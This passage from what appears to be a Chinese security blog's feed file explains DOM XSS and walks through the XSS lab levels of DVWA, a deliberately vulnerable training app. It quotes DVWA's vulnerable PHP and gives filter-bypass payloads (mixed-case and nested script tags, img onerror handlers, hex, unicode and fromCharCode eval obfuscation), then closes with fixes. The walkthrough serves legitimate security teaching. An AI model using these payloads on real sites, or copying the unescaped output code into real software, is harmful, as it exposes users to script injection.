class="name">pre</span>&gt;</span>Hello <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure><p>测试流程：</p><ol type="1"><li>输入页面上比较唯一的正常字符串（无引号，无大于小于号），看有没有在页面上回显，右键查看源码或开发者工具中定位到显示位，看是什么标签。</li><li>尝试输入一些带有大于小于号对或引号的不正常字符串，看页面如何显示，按F12 打开开发者工具，定位到显示位置看如何解析我们的输入</li><li></li></ol><h2 id="dom">DOM</h2><p>DOM 型的 XSS 由于其特殊性，常常被分为第三种，这是一种基于 DOM 树的XSS。例如服务器端经常使用 document.boby.innerHtml 等函数动态生成 html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生 DOM 型的XSS。DOM 型 XSS 可能是存储型，也有可能是反射型。</p><h3 id="原理-2">原理</h3><ol type="1"><li>用户在浏览器中访问携带有 XSS 脚本的链接</li><li>浏览器通过 JavaScript 从 URL 中提取 XSS 脚本中的内容，并写入到 DOM中，触发 XSS</li></ol><p>DOM 型与反射型的区别：DOM 型通过前端 JavaScript 将 XSS 脚本写入到 DOM中触发 XSS，而反射型是通过后端 Web 服务器中的 PHP 解释执行将 XSS脚本写入到页面中。浏览器渲染响应页面触发 XSS。</p><p>DOM 型 XSS 的一种情况：</p><p>XSS 不是在 URL 的参数中而是在 URL 的 hash 中，URL 的 hash是不会发送到 后端 Web 服务器的，说明向页面输出 XSS脚本的不是后端，是前端页面。我们可以在脚本中搜索 hash 来定位。</p><p>如果改变 # 后面 hash 的内容，点击Enter，页面是不会重载的，你需要手动去刷新。</p><p>dom 型 xss 是由 javascript来触发的，所以不能想其他两种那样通过查看页面源代码的方式在 html 中找到xss 脚本代码。我们需要去开发者工具中的还有 js 脚本的 html 中搜索。</p><p>补充：</p><p>JavaScript 中的三个弹窗函数：alert() confirm() prompt()</p><p>根据服务器的过滤情况，如果第一个被过滤了，我们可以尝试其他函数。</p><h3 id="文章推荐">文章推荐：</h3><p><ahref="https://tech.meituan.com/2018/09/27/fe-security.html">前端安全系列（一）：如何防止XSS 攻击？</a></p><p><ahref="https://blog.csdn.net/u011781521/article/details/53894399">XSS跨站脚本攻击(一)----XSS 攻击的三种类型</a></p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA 中的 XSS</title>
      <link href="/blog/2019/08/15/websec/xss/xss_dvwa/"/>
      <url>/blog/2019/08/15/websec/xss/xss_dvwa/</url>
      
        <content type="html"><![CDATA[<p>首先我们大致了解一下 dvwa 的代码结构（以 xss 的为例，其他类似）</p><p>dvwa 每个页面有一个 index.php ，在 index.php 中有这样一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$vulnerabilityFile</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">switch</span>( <span class="variable">$_COOKIE</span>[ <span class="string">&#x27;security&#x27;</span> ] ) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;low&#x27;</span>:</span><br><span class="line"><span class="variable">$vulnerabilityFile</span> = <span class="string">&#x27;low.php&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;medium&#x27;</span>:</span><br><span class="line"><span class="variable">$vulnerabilityFile</span> = <span class="string">&#x27;medium.php&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;high&#x27;</span>:</span><br><span class="line"><span class="variable">$vulnerabilityFile</span> = <span class="string">&#x27;high.php&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="variable">$vulnerabilityFile</span> = <span class="string">&#x27;impossible.php&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;vulnerabilities/xss_r/source/<span class="subst">&#123;$vulnerabilityFile&#125;</span>&quot;</span>;</span><br></pre></td></tr></table></figure><p>它通过判断 cookie 中的 security 来决定将参数提交到哪一个 php脚本上，所以我们看源码需要看 low、medium、high、impossible这些后端脚本如何处理参数。</p><h1 id="reflected-xss">Reflected XSS</h1><h2 id="low">low</h2><p>黑盒测试</p><ol type="1"><li><p>探测 xss</p><p>构造一个独一无二且不会被识别为恶意代码的字符串用来提交到页面，这里构造kidding，并提交。</p><p>看页面回显以及使用浏览器审查工具进行代码审查，寻找构造的字符串是否在页面中显示。</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/xss/dvwa/dvwa_reflected_xss_low.png" /></p><p>我们可以看到页面上回显：Hello kidding，而且在 Elements 中我们发现Hello kidding 这个文本，并未使用字符串包裹，也就是说，我们输入</p><script><p>标签，它就会当成脚本执行。</p></li><li><p>测试 xss</p><p>那么我们输入：&lt;script&gt;alert(/xss/)&lt;/script&gt;或&lt;/pre&gt;&lt;script&gt;alert(1)&lt;/script&gt;</p><p>如果不弹窗而且页面将我们的输入完整的回显出来或者都转成实体编码呼回显出来，那八成是凉了，htmlspecialchars警告。（你去 开发者工具定位，编辑html，就可以看到它将&lt;&gt;等特殊符号实体编码了）</p><p>弹窗成功，黑盒测试完成(第二种 payload只是告诉你可以闭合前面标签，再写 script 标签)</p></li></ol><p>代码讲解</p><p>上代码：low.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>array_key_exists()函数检查某个数组中是否存在指定的键名，如果键名存在则返回true，如果键名不存在则返回 false。</p><p>这里的 if 语句</p><p>一方面检查 $GET 数组中有无 name这个键，也就是我们的输入，即：检查有没有提交这个 name 参数</p><p>提交 name 参数状态：</p><p>http://localhost/dvwa-master/vulnerabilities/xss_r/?name=</p><p>未提交 name 参数状态：</p><p>http://localhost/dvwa-master/vulnerabilities/xss_r/</p><p>另一方面，检查我们如果提交了 name 参数，name 参数是否为空</p><p>只有满足提交了 name参数并且该参数不为空的条件下，才会执行后面的语句。</p><p>代码直接采用<code>get</code>方式传入了<code>name</code>参数，后面直接用一个html变量来拼接我们的参数，并没有任何的过滤与检查，存在明显的<code>XSS</code>漏洞，所以我们直接使用script 标签即可。</p><h2 id="meduim">meduim</h2><p>黑盒测试</p><ol type="1"><li><p>探测 XSS</p><p>输入独一无二字符串，搜索并在开发者工具中对应查看，发现前端没有什么区别</p></li><li><p>测试 xss</p><p>&lt;script&gt;alert(1)&lt;/script&gt;</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/xss/dvwa/dvwa_reflected_xss_medium.png" /></p><p>结果发现事情没那么简单，很明显后端过滤了 script标签，下面我们来绕过它的过滤。</p><p>绕过方式（与 SQL 注入的某些绕过方式一样）：</p><ol type="1"><li><p>大小写绕过（如果他只过滤小写的 script 标签，可以绕过）</p><p>&lt;sCript&gt;alert(1)&lt;/scRipt&gt;</p><p>绕过成功</p></li><li><p>嵌套绕过（如果它只过滤一次 script 标签，便可以绕过）</p><p>可以尝试两种：</p><p>&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt;</p><p>&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/scr&lt;/script&gt;ipt&gt;</p><p>我们发现第一种绕过了，那么为什么第二种不行呢？也就是为什么闭标签不用嵌套呢？后面我们白盒测试将代码的时候再讲。</p></li></ol></li></ol><p>代码讲解</p><p>上代码，medium.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>medium 基于黑名单的思想进行过滤。if 判断和 low 一样，这里多了一个str_replace 函数，将 script 标签的开标签 &lt;script&gt;给替换为了空格，而没有对其闭标签 &lt;/script&gt;进行处理，这也就是为什么我们之前使用开闭标签都嵌套的方式失败的原因了。</p><p>注：</p><p>php 变量名加 “ {} ” 主要是为了区分变量与文本。</p><p>一方面是为了防止变量名和后面的字符串连在一起，另一方面是怕变量名中有空格啥的（当然，咱这个name 没有空格啥的），没有什么其它的作用。</p><h2 id="high">high</h2><p>黑盒测试</p><p>重复前面的步骤，我们发现无法绕过 script的过滤，现在我们学习一些标签来触发 XSS。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">@</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面这些都可以，当然，还有一些更隐蔽的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&quot;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x27</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x27</span>\<span class="attr">x29</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&quot;\<span class="attr">u0061</span>\<span class="attr">u006c</span>\<span class="attr">u0065</span>\<span class="attr">u0072</span>\<span class="attr">u0074</span>\<span class="attr">u0028</span>\<span class="attr">u0031</span>\<span class="attr">u0029</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure><p>上面这两个分别是使用 alert(1) 的 16 进制编码和 unicode编码，这样可以绕过对 alert 等函数的过滤。</p><p>注：javascript 中的 eval 和别的语言的 eval函数功能一样，都是接收字符串，将字符串当做命令执行。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">onerror</span>=<span class="string">&quot;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))&quot;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure><p>String.fromCharCode 是返回 UTF-16 的 unicode编码对应的字符/字符串。（直接用 hackbar 的 String.fromCharCode加解密即可）</p><p>代码讲解</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>preg_replace()函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i 表示不区分大小写）不再有效。</p><p>(._)正则表达式(._)涉及到贪婪模式。当正则表达式中包含能接受重复的限定符时，通常的行为是（在使整个表达式能得到匹配的前提下）匹配尽可能多的字符。以这个表达式为例：a.*b，它将会匹配最长的以a 开始，以 b 结束的字符串。如果用它来搜索 aabab 的话，它会匹配整个字符串aabab。这被称为贪婪匹配。所以第一个程序第一个分组匹配的的结果是 Foundvalue:This order was placed forQT300，尽可能匹配多的字符（因为第二组还要匹配数字，所以匹配到 300）</p><p>所以我们一开始输入：&lt;script&gt;alert(1)</script>， 从最早的&lt;到最晚的 t ，中间全部被过滤掉了，只剩下一个 &gt;。</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/xss/dvwa/dvwa_reflected_xss_high.png" /></p><h2 id="impossible">impossible</h2><p>黑盒测试</p><p>直接测试：&lt;script&gt;alert(/xss/)&lt;/script&gt;</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/xss/dvwa/dvwa_reflected_xss_impossible.png" /></p><p>回显：Hello&lt;script&gt;alert(/xss/)</script>，它将你输入的特殊字符都完好的回显出来，到了这种时候，你心里要有一句话：是时候放弃了...</p><p>我们在开发者工具中定位，并 edit as html发现，果不其然，大于小于号都给实体化了，嗯，不愧是 impossible。</p><p>代码讲解</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>htmlspecialchars() 函数把预定义的字符(" &amp; &lt;&gt; ' )转换为 HTML实体。这样就基本杜绝了 XSS。</p><p>此外，在此函数中，默认不编码单引号，要加上 ENT_QUOTES参数才会编码单引号。在 dvwa中不编码单引号没有风险，但是在其他场景下，单引号就可能会被利用</p><h1 id="stored-xss">Stored XSS</h1><p>温馨提示：存储型 xss 会一直有，对后续使用 dvwa不友好，还要自己去数据库删除，可以选择 Setup/Reset DB 来重置 dvwa</p><p>黑盒测试</p><p>首先，我们测试 Message 栏，我们在 Name 栏输入 Hello， 在 Message栏输入 &lt;script&gt;alert(/xss/)&lt;/script&gt;，成功弹窗。</p><p>然后，我们测试 Name 栏，我们尝试在 Name 栏输入&lt;script&gt;alert(/xss/)&lt;/script&gt;，但是发现它限制了长度（一般，你在输入那里输着输着，输不动了，就是前端限制），打开开发者工具，我们看到：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;txtName&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">size</span>=<span class="string">&quot;30&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;10&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>字符串长度最长为10，此长度限制为<strong>前端限制</strong>，我们有两种方式突破</p><ol type="1"><li>直接 F12 在 Elements 中的对应长度处，改长度</li><li>burp suite 抓包，直接改 name 的值</li></ol><p>然后，测试弹窗成功。</p><p>代码讲解</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line"><span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize message input</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$message</span> );</span><br><span class="line"><span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize name input</span></span><br><span class="line"><span class="comment">//代码基本同上（我这里不抄过来了）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Update database</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"><span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>trim() 函数</p><p>移除字符串两侧的空白字符或其他预定义字符。</p><p>语法：trim(string,charlist) 若无 charlist，则移除字符串两侧的空白字符，否则，移除 charlist 中的字符。</p><p>stripslashes() 函数</p><p>删除由 <ahref="https://www.w3school.com.cn/php/func_string_addslashes.asp">addslashes()</a>函数添加的反斜杠。</p><p><strong>提示：</strong>该函数可用于清理从数据库中或者从 HTML表单中取回的数据。</p><p>mysqli_real_escape_string 函数</p><p>mysqli_real_escape_string() 函数转义在 SQL语句中使用的字符串中的特殊字符，用来防止 SQL注入，仅在写数据库的时候才需要调用这个函数。</p><p>可以看到，对输入并没有做 XSS 方面的过滤与检查（做了对 SQL执行方面的检查，所以不太好进行 SQL注入），且存储在数据库中，因此这里存在明显的存储型 XSS 漏洞。</p><h2 id="medium">medium</h2><p>黑盒测试</p><p>首先测试，Message，测试以下 payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_ invoke__">alert</span>(xss)&lt;/script&gt;</span><br><span class="line">&lt;img src=@ onerror=<span class="title function_ invoke__">alert</span>(/xss/)&gt;</span><br><span class="line">&lt;iframe onload=<span class="title function_ invoke__">alert</span>(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;body onload=<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure><p>均未成功，放弃</p><p>测试 Name，测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_ invoke__">alert</span>(xss)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;scrIpt&gt;<span class="title function_ invoke__">alert</span>(xss)&lt;/sCript&gt;</span><br></pre></td></tr></table></figure><p>大写那个测试弹窗，看来对 Message 做了较强的过滤，对 Name只做了过滤小写 script 标签的黑名单。</p><p>当然，双写也能绕过，这里就不再做演示了。</p><p>代码讲解</p><p>大致代码与上面 low 相同，不同的相信我们呀猜出来了。</p><p>$message 多了一步 htmlspecialchars 的处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br></pre></td></tr></table></figure><p>$name 多了过滤 &lt;script&gt; 的操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br></pre></td></tr></table></figure><h2 id="high-1">high</h2><p>黑盒测试</p><p>从 medium 我们知道 Message 是不可能了，接着尝试 Name，大写与嵌套失败，使用别的标签，比如：img，iframe，body 标签绕过成功。</p><p>代码讲解</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br></pre></td></tr></table></figure><p>可以看到，这里用正则完全地过滤了 script 标签，所以我们使用 script标签不再奏效。</p><h2 id="impossible-1">impossible</h2><p>黑盒测试</p><p>使用以下 payload 进行测试，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="title function_ invoke__">alert</span>(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure><p>回显：</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/xss/dvwa/stored_xss_impossible.png" /></p><p>我们看到 &lt;&gt; 均被实体化编码了，凉凉。</p><p>代码讲解</p><p>不出所料，Name 和 Message 参数都进行了 htmlspecialchars 处理。</p><p>一个坏习惯：</p><p>测试留言板要一个个测试，不要两个一起都输入 xss payload测试，很能会相互影响，这里就因为二者挨着，相互影响，导致测试失败。</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/xss/dvwa/stored_xss_notice.png" /></p><h1 id="dom-xss">DOM XSS</h1><p>未完待续...</p><p>总结回顾：</p><ol type="1"><li><p>测试漏洞时，要一个一个点的测试，不要相邻的点就一起测试，不然，如果他们在代码中是一起的，容易相互影响。</p></li><li><p>修复方式： 输入过滤：提倡白名单，在服务端对用户的输入做好限制</p><p>输出过滤：如果是输出到 html 中，那进行 html 编码；如果是输出到 js中，js 转义</p></li><li><p>存储型 XSS一旦存储上每次访问对应地方都会触发，很烦。尤其在测试别人的网站的时候，不要使用弹窗的XSS payload，最好使用 XSS 平台检测。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webug之post注入</title>
      <link href="/blog/2019/08/04/websec/sql_injection/post_injection_of_webug/"/>
      <url>/blog/2019/08/04/websec/sql_injection/post_injection_of_webug/</url>
